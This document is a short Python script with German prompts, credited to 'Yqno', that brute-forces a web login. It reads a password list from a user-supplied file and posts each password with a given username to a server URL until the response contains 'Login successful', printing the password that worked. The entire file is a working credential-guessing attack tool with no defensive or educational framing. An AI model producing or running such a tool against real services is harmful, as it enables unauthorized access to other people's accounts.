import requests
import os

# Benutzer nach dem Pfad zur passwords.txt-Datei fragen
print("Made by Yqno")
path1 = input("Geben Sie den Pfad zur passwords.txt-Datei ein: ")
url = input("Geben Sie die URL des Servers ein: ")
username = input("Geben Sie den Benutzernamen ein: ")

if not os.path.isfile(path1):
    print("\033[1;31mFehler: Datei nicht gefunden\033[0m")
    exit(1)

with open(path1, 'r') as f:
    passwords = f.read().splitlines()

for password in passwords:
    print(f"Versuche Passwort: {password}")
    response = requests.post(url, data={"username": username, "password": password})
    if "Login successful" in response.text:
        print(f"\033[1;32mErfolgreiches Login mit Passwort: {password}\033[0m")
        break
    else:
        print(f"Fehlgeschlagen mit Passwort: {password}")
